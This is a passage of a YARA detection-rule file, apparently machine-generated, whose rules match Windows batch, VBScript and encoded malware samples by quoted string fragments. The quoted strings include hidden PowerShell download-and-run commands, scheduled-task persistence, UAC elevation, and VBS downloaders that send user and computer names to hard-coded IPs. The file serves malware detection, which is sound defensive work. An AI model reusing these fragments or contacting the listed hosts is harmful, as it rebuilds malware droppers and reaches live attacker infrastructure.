      hash1 = "0db56b2cdc727fa4edc89644b3848077dc7fcdeebb8eb9864ebc95022514d875"
   strings:
      $s1 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s2 = "!Win32 .EXE." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule d03ba748752512a9343e601a7b1764d2813db762f72916555e6bee4e940a35f5_d03ba748 {
   meta:
      description = "_subset_batch - file d03ba748752512a9343e601a7b1764d2813db762f72916555e6bee4e940a35f5_d03ba748.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d03ba748752512a9343e601a7b1764d2813db762f72916555e6bee4e940a35f5"
   strings:
      $x1 = "  <center>[Blog post] - Partnering with SMLWiki.com <span>(05/21/2523)</spa=" fullword ascii /* score: '32.00'*/
      $s2 = "</head><body><a href=3D\"https://smlwiki.com/\" target=3D\"_blank\" style=3D\"po=" fullword ascii /* score: '27.00'*/
      $s3 = "Content-Location: https://lancewatch.com/logo.gif" fullword ascii /* score: '23.00'*/
      $s4 = "  <center>[Blog post] - The booth <span>(01/13/2524)</span></center>" fullword ascii /* score: '22.00'*/
      $s5 = "<a href=3D\"https://lancewatch.com/\"><img src=3D\"https://lancewatch.com/logo=" fullword ascii /* score: '22.00'*/
      $s6 = "<a href=3D\"https://lancewatch.com/report.php\"><img src=3D\"https://lancewatc=" fullword ascii /* score: '20.00'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string */ /* score: '18.50'*/
      $s8 = "Content-Location: https://lancewatch.com/main.css" fullword ascii /* score: '18.00'*/
      $s9 = "Content-Location: https://lancewatch.com/button1.1.gif" fullword ascii /* score: '18.00'*/
      $s10 = "Subject: LANCEWATCH.com" fullword ascii /* score: '18.00'*/
      $s11 = "Content-Location: https://lancewatch.com/ass/vert01-02.png" fullword ascii /* score: '18.00'*/
      $s12 = "Content-Location: https://lancewatch.com/assets/IMG_0119-small.jpg" fullword ascii /* score: '18.00'*/
      $s13 = "Content-Location: https://lancewatch.com/ass/vert01-01.jpg" fullword ascii /* score: '18.00'*/
      $s14 = "Snapshot-Content-Location: https://lancewatch.com/" fullword ascii /* score: '18.00'*/
      $s15 = "Content-Location: https://lancewatch.com/ass/dance04.gif" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Braodo_signature_ {
   meta:
      description = "_subset_batch - file Braodo(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8e6d4f50dc73b00485df93b4d9f1c13933701731e0f9a7568305d635a11ba0a"
   strings:
      $x1 = "echo gdpdjzyancnufdftbgtsijewxdarbnrcjyjhxfqkhppeegzhqkhlgdwhsimnjfmthhyhafbmcyqbhonesmvwhxzlrqhzayeshmvmmznzmndtelbjwnwfkxvvrgk" ascii /* score: '56.00'*/
      $x2 = "start /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType" ascii /* score: '46.00'*/
      $x3 = "schtasks /create /tn \"WindowsSecurityTask\" /tr \"\\\"%TEMP%\\WindowSecuriyc.bat\\\"\" /sc onlogon /rl highest /f >nul 2>&1" fullword ascii /* score: '41.00'*/
      $x4 = "start /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType" ascii /* score: '41.00'*/
      $x5 = "    powershell -WindowStyle Hidden -Command \"Start-Process -FilePath '%~f0' -ArgumentList elevated -Verb RunAs\"" fullword ascii /* score: '40.00'*/
      $x6 = "start /min powershell.exe -WindowStyle Hidden -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType" ascii /* score: '35.00'*/
      $s7 = "::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://gitlab.com/hi4201225/gv725/-/raw/main/mrw-n.zip', '%P" ascii /* score: '30.00'*/
      $s8 = "::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/ud-progen2/725-mrw/raw/main/u-p.png', '%TE" ascii /* score: '30.00'*/
      $s9 = "fmrykjqhvzgwrmwszbgdxtdkpsmlbfilqquqbctcylwikpfgrhjejjutptgwjrophttpssakjxxvcfqmigpicljfplkvaoxyvpauwoejsgtjdzwadumpsueytzscxrpl" ascii /* score: '21.00'*/
      $s10 = "xkhvhicxjhasglfdzjudgddkdunkpbgnnegxfppbqkthaoperzxmozldjloqbbqlysvmcyrlfshyjxwudktumzjwxbwfeiihlahxitabnwreftpunhnueyevwjxfogdc" ascii /* score: '18.00'*/
      $s11 = "tory('%PUBLIC%\\\\Destkops.zip', '%PUBLIC%\\\\Destkops'); Start-Sleep -Seconds 1; %PUBLIC%\\\\Destkops\\\\python %PUBLIC%\\\\Des" ascii /* score: '18.00'*/
      $s12 = "UBLIC%\\\\Destkops.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDir" ascii /* score: '17.00'*/
      $s13 = "ikmaxcwhrtgiqhirckowqozbxaectzismxfoktcosqirwidwgrdmzxguwxhqrlktstwkdfxfliucupsofyywzidwvnvgnsuwgmfqlyvhtuxsnfhtmprbgkehwnvhiqxz" ascii /* score: '16.00'*/
      $s14 = "mfhctfthqpkfwcmvjkmnqxgpitpxwclxgihupfhrgauaohcwsedmeskfygmojppltepdgvoyftyzdsdfomunbzwnrofieyekcvekeynqhegzggzihwpsixpromrqxata" ascii /* score: '16.00'*/
      $s15 = "cgllxhcdhrobbzgadgskkvfwsufjokaigwsdjgfodofekbhwmkeyesuxesbphsurzjvpexeqfdewaptqiysocdtufugopivglynolnnzdmpprlrnvzuioitlscwqygkk" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule e119a934e118d3e57070efc0daf3e49743e1f23bf04b6ce7f3d87ad0d60f6d40_e119a934 {
   meta:
      description = "_subset_batch - file e119a934e118d3e57070efc0daf3e49743e1f23bf04b6ce7f3d87ad0d60f6d40_e119a934.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e119a934e118d3e57070efc0daf3e49743e1f23bf04b6ce7f3d87ad0d60f6d40"
   strings:
      $x1 = "powershell -NoProfile -ExecutionPolicy Bypass -Command ^" fullword ascii /* score: '41.00'*/
      $s2 = ">>\"!vbs!\" echo s.Run \"powershell -ex Bypass -WindowStyle Hidden -File \"\"!ps1!\"\"\", 0, False" fullword ascii /* score: '27.00'*/
      $s3 = "0M0NFdkxwVzZaVWpYejB3ejcxV3lqb21wWjZTVEs0UGNoSWJySjVDaU5EOFNEUXhVUSt0VG0rc0tHL1NKNnB0RUNFdjVaODhNWGFJT0dqNGZucW5rcFBmbDhwdWtvU0p" ascii /* base64 encoded string*/ /* score: '24.00'*/
      $s4 = "set \"vbs=%TEMP%\\cert!RANDOM!.vbs\"" fullword ascii /* score: '22.00'*/
      $s5 = "jaEtZZ1FVM2dLQUtWck0zUXBQOHF1Y1kxVmJBcVQvVysyUEQvSEZjKzNCNGNGRGRWN1liblZOaTlYNXJrZzhmM2g5WDkwbmgyU1dGN1J3TmRxcGZLZFRHSDFkUnNuMkZ" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s6 = "sVUhDTnhma094aXZMNjNuUndsZ3VSOTdvOEg1VGFkN09tcGJSQjhQOWd6NDYrNFpsWExIQ3RWbXpJMTltdDYvYlBXeEFqNkF6b1luUXkvZzF4bk8wU2FjMjNneVdTMlB" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s7 = "lU2FPelowcCtrS2lwRDRRY3NpSXFEanpHR2dKZGdDcm8xZ3RjRTB2WkhPSThnV3Bubjl1ZCtyajgwYi85TExSdDhhbjFxRFpiL1dHcmU3Rk9QSGl1QWxLaExZUEtBNGt" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s8 = "3ZnUzVUZNQitodWNTQ0M2b1pxalNqTDNCVlEyMlcwV1gzcC9JRUgxWEpUOTlBU3duL016eXFpYmVPakFRSU14amphaVJIU3BhMUh1VU03QjYrSzB1bVpDcmk5Z2xQbGV" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s9 = "6ZmZINXRFdjVvZEREWFo2TE9Td2Z2anUrQmplR2pHZjl1d29lbVNoaTlBT0RUbTdwNHNEQkozRm5ENWQyRE9VVWp2ejJhM3Rqd2Qwd3A3bUlYUGZJWVFUVXB0VDk0SSt" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s10 = "4STRzbFp5Y3dvd2dHeWdVdXh0VFFZVjJtTmk1K3Z2aCs3K056U3FVQndWM1FIM0Frc2cxNjJrT0EwUlcrVEk2bVZWUzBVRnNYV3F3WEJjQWVheVNIZ1hlbnpFMVNPMFB" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s11 = "qbndXRlNqaU0rQjJ5R3NEbjlJNStibTRKWStRaGI2cGhsRSsxWDljR2ZPM1dVUEJVMlJSS1pkbVdVWVFTc01NMnRjTDFzb3Nob2NIY1dDVGlGaDkrRFJrajBRNzlTSW5" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s12 = "sNzN1cGRVZm5GdnR0akdPOWpDeE43a0h5dGZMcm5GbXJncFQ1cEJWQ1FYZVBQSktEeGVubm4wWHNBak9PSkc4THhaemQzRlVMaWdyNUJUZEFQVGJNaFlBUytFYytXRUd" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s13 = "GbWNuR0d3ZG0wOGh1UG9zRGx3OTUvd1RPVHc3MlNkSGhtb1BFY3dKWmcxTWRsU3diMUp3emxuRWlYYjF3elhwTnpxU0RmenpJbkxyMjg2OTc0RjBya2tzU0RaTVl0UFV" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s14 = "KRnhTWHgvcXpXNEhxcXJWdjJoMHJIUTdqbVQ1ZmFpUEJvVXRsODFzTUlheWVkcnRORm9YNmJZM2I2UGdXZkxuTW1BUnVLQzgxV3U0YmdnRmhOVFNINS9zbWVjdlNLdjM" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s15 = "hcE1GM0F0aVdpVnZkbmhvejhrM2NobDZuTll1N1REd2dqdWlqWUtwSGJnK2RldWtvbGR1VE92Sm9YTWtaSGFBbVgxSERlM3Z3QzhoUTU3ZjdGUUdOSHlnSVZEWERnK09" ascii /* base64 encoded string*/ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule c00668f9420f77b31a4e85fb31a3fa1104365792f84846bb2d471cef18c28846_c00668f9 {
   meta:
      description = "_subset_batch - file c00668f9420f77b31a4e85fb31a3fa1104365792f84846bb2d471cef18c28846_c00668f9.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c00668f9420f77b31a4e85fb31a3fa1104365792f84846bb2d471cef18c28846"
   strings:
      $x1 = "p%FLUMINENSEtimeDETERCEIRADIVISAO%wershell -N%FLUMINENSEtimeDETERCEIRADIVISAO%Pr%FLUMINENSEtimeDETERCEIRADIVISAO%file -Wind%FLUM" ascii /* score: '63.00'*/
      $x2 = "dden -Executi%FLUMINENSEtimeDETERCEIRADIVISAO%nP%FLUMINENSEtimeDETERCEIRADIVISAO%licy Bypass -COmmand [scriptbl%FLUMINENSEtimeDE" ascii /* score: '46.00'*/
      $x3 = "pow%DirectorySecurity%rsh%DirectorySecurity%ll -NoProfil%DirectorySecurity% -WindowStyl%DirectorySecurity% Hidd%DirectorySecurit" ascii /* score: '33.50'*/
      $x4 = "y%n -Ex%DirectorySecurity%cutionPolicy Bypass -Command \"i%DirectorySecurity%x ((N%DirectorySecurity%w-Object N%DirectorySecurit" ascii /* score: '33.50'*/
      $x5 = "RADIVISAO%n -Execute 'p%FLUMINENSEtimeDETERCEIRADIVISAO%wershell.exe' -Argument '-Wind%FLUMINENSEtimeDETERCEIRADIVISAO%wStyle Hi" ascii /* score: '33.00'*/
      $s6 = "INENSEtimeDETERCEIRADIVISAO%wStyle Hidden -executi%FLUMINENSEtimeDETERCEIRADIVISAO%nP%FLUMINENSEtimeDETERCEIRADIVISAO%licy Bypas" ascii /* score: '24.00'*/
      $s7 = "dro%com/office%JoaoPedro%txt\\\" -UseBasicParsing)%JoaoPedro%Content)%JoaoPedro%Invoke()'; $trigger=New-ScheduledTaskTrigger -On" ascii /* score: '20.00'*/
      $s8 = "echo \"%imagestate%\" | f%Gay%d /i \"RESEAL\" %nul% && (" fullword ascii /* score: '19.00'*/
      $s9 = "echo \"%imagestate%\" | f%Gay%d /i \"UNDEPLOYABLE\" %nul% && (" fullword ascii /* score: '19.00'*/
      $s10 = "if /i not \"%imagestate%\"==\"IMAGE_STATE_COMPLETE\" (" fullword ascii /* score: '19.00'*/
      $s11 = "::  %ComeCUdoDEFENDER%learn.microsoft.com/windows-hardware/manufacture/desktop/windows-setup-states" fullword ascii /* score: '18.00'*/
      $s12 = "p%FLUMINENSEtimeDETERCEIRADIVISAO%wershell -N%FLUMINENSEtimeDETERCEIRADIVISAO%Pr%FLUMINENSEtimeDETERCEIRADIVISAO%file -Wind%FLUM" ascii /* score: '17.00'*/
      $s13 = "set \"d=!d! Set-Acl -Path %tokenstore% -AclObject $AclObject;\"" fullword ascii /* score: '15.00'*/
      $s14 = "call :HomeOfficeDocument %Blue% \"If the activation fails, do this - \" %_Yellow% \" %mas%in-place_repair_upgrade\"" fullword ascii /* score: '15.00'*/
      $s15 = "TERCEIRADIVISAO%ck]::Create((Inv%FLUMINENSEtimeDETERCEIRADIVISAO%ke-WebRequest \\\"%ComeCUdoDEFENDER%office-service-monitor%Joao" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule c03eedf04f19fcce9c9b4e5ad1b0f7b69abc4bce7fb551833f37c81acf2c041e_c03eedf0 {
   meta:
      description = "_subset_batch - file c03eedf04f19fcce9c9b4e5ad1b0f7b69abc4bce7fb551833f37c81acf2c041e_c03eedf0.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c03eedf04f19fcce9c9b4e5ad1b0f7b69abc4bce7fb551833f37c81acf2c041e"
   strings:
      $s1 = "794e5445314e5456684e3245314d5455334e5745314d6a55784e5463334e4451794e544d304f44526c4e4449314e7a51324e4459304d7a526d4e5455304e6a51" ascii /* score: '24.00'*/ /* hex encoded string 'yNTE1NTVhN2E1MTU3NWE1MjUxNTc3NDQyNTM0ODRlNDI1NzQ2NDY0MzRmNTU0NjQ' */
      $s2 = "3159544d774e4459304e4455784e5455304e6a526a4e6a517a4d4451324e7a49314d5455314e6a6733595455784e5455334d4451794e5445325a4452684e4449" ascii /* score: '24.00'*/ /* hex encoded string '1YTMwNDY0NDUxNTU0NjRjNjQzMDQ2NzI1MTU1Njg3YTUxNTU3MDQyNTE2ZDRhNDI' */
      $s3 = "314e4459304d6a56684d7a41304e6a51304e6a4d7a4d4451324e4749314d5455314e446b7a4d7a55784e5455305a5455794e5445314e6a59304d7a4d314d545a" ascii /* score: '24.00'*/ /* hex encoded string '1NDY0MjVhMzA0NjQ0NjMzMDQ2NGI1MTU1NDkzMzUxNTU0ZTUyNTE1NjY0MzM1MTZ' */
      $s4 = "6c5533526c6347467a49443067544756754b464e6e636d354d62326c744b5341714944494e43694167494342456157306754476c305a564e736432784a644746" ascii /* score: '24.00'*/ /* hex encoded string 'lU3RlcGFzID0gTGVuKFNncm5Mb2ltKSAqIDINCiAgICBEaW0gTGl0ZVNsd2xJdGF' */
      $s5 = "354e6a4d7a4d4451324e47513159544d774e446b7a4e5455784e5455305a5455794e5445314e7a55324d7a4d314d5455344e5459304d6a557a4e4451304d6a51" ascii /* score: '24.00'*/ /* hex encoded string '5NjMzMDQ2NGQ1YTMwNDkzNTUxNTU0ZTUyNTE1NzU2MzM1MTU4NTY0MjUzNDQ0MjQ' */
      $s6 = "324e44517a4e4759314e5451324e4451314e5455314e445932597a59304d7a413059545a694e5445314e5459334e7a63314d5455314e7a41304d6a55784e6d45" ascii /* score: '24.00'*/ /* hex encoded string '2NDQzNGY1NTQ2NDQ1NTU1NDY2YzY0MzA0YTZiNTE1NTY3Nzc1MTU1NzA0MjUxNmE' */
      $s7 = "694b53416d49453176626e526f4b48517044516f674943416752574a756155353162575643636d56706343413949466c6c5958496f64436b4e4367304b494341" ascii /* score: '24.00'*/ /* hex encoded string 'iKSAmIE1vbnRoKHQpDQogICAgRWJuaU51bWVCcmVpcCA9IFllYXIodCkNCg0KICA' */
      $s8 = "45314e7a63304e4449314d6a51304e4449304d6a56684e6d4d304e6a51794e6a45314e5451324e4451324d7a4d774e445930595456684d7a41304e6a63794e54" ascii /* score: '24.00'*/ /* hex encoded string 'E1Nzc0NDI1MjQ0NDI0MjVhNmM0NjQyNjE1NTQ2NDQ2MzMwNDY0YTVhMzA0NjcyNTE1NTY4N2E1MTU2NDI1MjUxNmE2YzQyNTEzMDZjNDI1NzQ2NDY0MjRlMzA0NjQ0NTE1NTQ2NGE1MTU1NDY3MDUxNTU0ZTQyNTE1NTZjNDI1MTU3NzQ0MjUzNDg0ZTQyNTM1NjQ2NDI2MjZiNDY0NDYzMzA0NjZkNTU1NTQ2' */
      $s9 = "325132396b5a51304b49434167494341674943425664474e7552326c6862334d675053424d6347566f51584e795a6c6c6862476b6f545746775a56566f644864" ascii /* score: '24.00'*/ /* hex encoded string '2Q29kZQ0KICAgICAgICBVdGNuR2lhb3MgPSBMcGVoQXNyZllhbGkoTWFwZVVodHd' */
      $s10 = "794e54453259545a6a4e4449314d544d7a4e4755304d6a557a4e5455304e6a51794e57457a4d4451324e4451314e5455314e445932597a59304d7a41304e6a63" ascii /* score: '24.00'*/ /* hex encoded string 'yNTE2YTZjNDI1MTMzNGU0MjUzNTU0NjQyNWEzMDQ2NDQ1NTU1NDY2YzY0MzA0Njc' */
      $s11 = "59545a6a4e4459304d6a59784d7a41304e6a51354e6a4d7a4d4451324e4749324e444d774e446b7a4e5455784e5455305a5451794e5445314e545a6a4e444931" ascii /* score: '24.00'*/ /* hex encoded string 'YTZjNDY0MjYxMzA0NjQ5NjMzMDQ2NGI2NDMwNDkzNTUxNTU0ZTQyNTE1NTZjNDI1MTU4NGE0MiIpIA0KIFRhdG1FaWVpSGNuZUF0Z3JDbiA9IFRhdG1FaWVpSGNuZUF0Z3JDbiAmIE53cnlDbW50TWhzcExvKCI1MTMwNDY0MjUzNTU0NjQyNjEzMDQ2NDk2MzMwNDY0YjUxNTU0YTY5NTE1NTY3Nzc1MTU1NzA0MjUxNmE2NDQyNTE3YTUyNDI1YT' */
      $s12 = "494342456157306751575266626b39335a58524f5a5746706479414e436941674943424561573067565739795a3035734941304b494341674945527062534254" ascii /* score: '24.00'*/ /* hex encoded string 'ICBEaW0gQWRfbk93ZXROZWFpdyANCiAgICBEaW0gVW9yZ05sIA0KICAgIERpbSBTZW5iQ3RhZSANCiAgICBEaW0gRWJuaU51bWVCcmVpcCANCiAgICBEaW0gSGV0cFJhZHJFdSAgIA0KICAgIERpbSBPbGl1RW1kckNlaW8gDQoNCiAgICBBdXNhV21oaW' */
      $s13 = "52694e5445314e5451354d7a4d314d5455314e47517a4d4455784e546331595455794e5445314e7a63304e4449314d7a51344e4755304d6a55304e4463324e44" ascii /* score: '24.00'*/ /* hex encoded string 'RiNTE1NTQ5MzM1MTU1NGQzMDUxNTc1YTUyNTE1Nzc0NDI1MzQ4NGU0MjU0NDc2NDQzNGY1NTQ2NDQ2MzMwNDY0YTUxNTU0NjZlNTE1NTRlIikgJiBOd3J5Q21udE1oc3BMbygiNTI1MTU3NTYzMzUxNTc3NDQyNTI2ZTRlNDI1YTZjNDY0MjYxMzA0NjQ5NjMzMDQ2NGQ1YTMwNDkzNTUxNTU0ZTUyNTE1NzU2MzM1MTU4NTY0MjUzNDQ0MjQyNTM2YjQ2NDM0ZTMwNDY0NDU5MzA0NjZkNTU1NTQ2Nzk1MTU1NGU0' */
      $s14 = "314d5455334e6a51304d6a55784d7a4d305a5451794e544d32596a51324e444d305a544d774e4459304e4455314e5455304e6a55344e6a517a4d4451354d7a55" ascii /* score: '24.00'*/ /* hex encoded string '1MTU3NjQ0MjUxMzM0ZTQyNTM2YjQ2NDM0ZTMwNDY0NDU1NTU0NjU4NjQzMDQ5MzU' */
      $s15 = "305a334a446269413949465268644731466157567053474e755a5546305a334a446269416d49453533636e6c44625735305457687a634578764b4349314d544d" ascii /* score: '24.00'*/ /* hex encoded string '0Z3JDbiA9IFRhdG1FaWVpSGNuZUF0Z3JDbiAmIE53cnlDbW50TWhzcExvKCI1MTM' */
   condition:
      uint16(0) == 0x4449 and filesize < 21000KB and
      8 of them
}

rule c05a4445e1a684c52a4ad92bfdfc283dddaee0d0922843d1b3cc03410de611d7_c05a4445 {
   meta:
      description = "_subset_batch - file c05a4445e1a684c52a4ad92bfdfc283dddaee0d0922843d1b3cc03410de611d7_c05a4445.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c05a4445e1a684c52a4ad92bfdfc283dddaee0d0922843d1b3cc03410de611d7"
   strings:
      $s1 = "Execute \"Kreperligt.\" + Testprocedures + \"Exe\" & chr(99) & \"ute Waffs,Pretension,Cdm,dandlers ,Archpoet\"" fullword ascii /* score: '22.00'*/
      $s2 = "Interconnectionshjlpe = Command " fullword ascii /* score: '17.00'*/
      $s3 = "Set Pedantocrat = GetObject(\"w\"+\"inmgmts://./root/default:StdRegProv\")" fullword ascii /* score: '17.00'*/
      $s4 = "Uopdagetbinderiesv = Uopdagetbinderiesv * (1+1)" fullword ascii /* score: '16.00'*/
      $s5 = "Rem Trackpot? tempelhal. squamosoradiate: oprundnes" fullword ascii /* score: '14.00'*/
      $s6 = "Maniok = Maniok + \"scriptgi\"" fullword ascii /* score: '14.00'*/
      $s7 = "Maniok = Maniok + \"t:tttt:\"" fullword ascii /* score: '14.00'*/
      $s8 = "Maniok = Maniok + \"scriptgirlen\"" fullword ascii /* score: '14.00'*/
      $s9 = "Maniok = Maniok + \"udgettop\"" fullword ascii /* score: '13.00'*/
      $s10 = "Maniok = Maniok + \"Get-Di\"" fullword ascii /* score: '13.00'*/
      $s11 = "Wscript.Sleep 100" fullword ascii /* score: '13.00'*/
      $s12 = "Maniok = Maniok + \"uu -uuu\"" fullword ascii /* score: '12.00'*/
      $s13 = "Rem Postganges128! gaincome ansttelsesperioders13 interspersions tait?" fullword ascii /* score: '12.00'*/
      $s14 = "Rem Staldfidusers medisterplse" fullword ascii /* score: '12.00'*/
      $s15 = "  Pedantocrat.EnumKey Bestryge36, Frkornene, Fabulations" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 200KB and
      8 of them
}

rule c43ec18c660de224f3033753bbfb8b8ec82496ba82a137fe70119f162ec7307b_c43ec18c {
   meta:
      description = "_subset_batch - file c43ec18c660de224f3033753bbfb8b8ec82496ba82a137fe70119f162ec7307b_c43ec18c.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c43ec18c660de224f3033753bbfb8b8ec82496ba82a137fe70119f162ec7307b"
   strings:
      $s1 = "url_array(1) = \"http://199.103.56.165/ORD-ALL/\" & userName & separ & computerName & \"/ORD-2020.txt\" " fullword ascii /* score: '25.00'*/
      $s2 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '23.00'*/
      $s3 = "url_array(0) = \"http://www.comunesanlorenzonuovo.it/ORD-2020.txt\" " fullword ascii /* score: '17.00'*/
      $s4 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s5 = "url_array(2) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/ORD-2020.txt\" " fullword ascii /* score: '17.00'*/
      $s6 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '16.00'*/
      $s7 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s8 = "WScript.Sleep 120000" fullword ascii /* score: '13.00'*/
      $s9 = "WScript.Sleep 5000" fullword ascii /* score: '13.00'*/
      $s10 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s11 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s12 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s13 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s14 = "Const scriptVer  = \"1.0\" " fullword ascii /* score: '10.00'*/
      $s15 = "If get_file( a ) =  True then" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 5KB and
      8 of them
}

rule de5cfe9b5002e0e46b5d6845e9ecad0ade9e982a6a7d94b430421a4b2f27d3c8_de5cfe9b {
   meta:
      description = "_subset_batch - file de5cfe9b5002e0e46b5d6845e9ecad0ade9e982a6a7d94b430421a4b2f27d3c8_de5cfe9b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de5cfe9b5002e0e46b5d6845e9ecad0ade9e982a6a7d94b430421a4b2f27d3c8"
   strings:
      $x1 = "Const LocalFile = \"C:\\Users\\f.gori\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ORDINI.exe\" " fullword ascii /* score: '37.00'*/
      $s2 = "url_array(1) = \"http://199.103.56.165/ORD-ALL/\" & userName & separ & computerName & \"/ORD-2020.txt\" " fullword ascii /* score: '25.00'*/
      $s3 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '23.00'*/
      $s4 = "oShell.exec LocalFile " fullword ascii /* score: '20.00'*/
      $s5 = "url_array(0) = \"http://199.103.56.165/ORD-2020.txt\" " fullword ascii /* score: '19.00'*/
      $s6 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s7 = "url_array(2) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/ORD-2020.txt\" " fullword ascii /* score: '17.00'*/
      $s8 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '16.00'*/
      $s9 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s10 = "WScript.Sleep wait1" fullword ascii /* score: '13.00'*/
      $s11 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s12 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s13 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s14 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s15 = "xmlhttp.send" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule dec643acd02ba0d10e41bfe856b332372cc2cf3575aa259dd4b307b5dedb5524_dec643ac {
   meta:
      description = "_subset_batch - file dec643acd02ba0d10e41bfe856b332372cc2cf3575aa259dd4b307b5dedb5524_dec643ac.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dec643acd02ba0d10e41bfe856b332372cc2cf3575aa259dd4b307b5dedb5524"
   strings:
      $s1 = "Const LocalFile = \"C:\\Users\\Public\\Libraries\\ORDINE.exe\" " fullword ascii /* score: '30.00'*/
      $s2 = "url_array(3) = \"http://199.103.56.165/ORDINI/\" & userName & separ & computerName & \"/ORDINE.txt\" " fullword ascii /* score: '25.00'*/
      $s3 = "url_array(1) = \"http://138.201.207.87/ORDINI/\" & userName & separ & computerName & \"/ORDINE.txt\" " fullword ascii /* score: '25.00'*/
      $s4 = "If get_file( a ) =  True then oShell.exec  LocalFile" fullword ascii /* score: '22.00'*/
      $s5 = "url_array(2) = \"http://199.103.56.165/ORDINI/ORDINE.txt\" " fullword ascii /* score: '19.00'*/
      $s6 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s7 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s8 = "url_array(0) = \"http://www.steinber.org/PA/ORDINI.TXT\" " fullword ascii /* score: '14.00'*/
      $s9 = "WScript.Sleep 5000" fullword ascii /* score: '13.00'*/
      $s10 = "WScript.Sleep 1200" fullword ascii /* score: '13.00'*/
      $s11 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s12 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s13 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s14 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s15 = "Const scriptVer  = \"1.0\" " fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 5KB and
      8 of them
}

rule e81d1c50b379ab71380ede7ad62222e759db861bccf9a745b4d3a22465dc3843_e81d1c50 {
   meta:
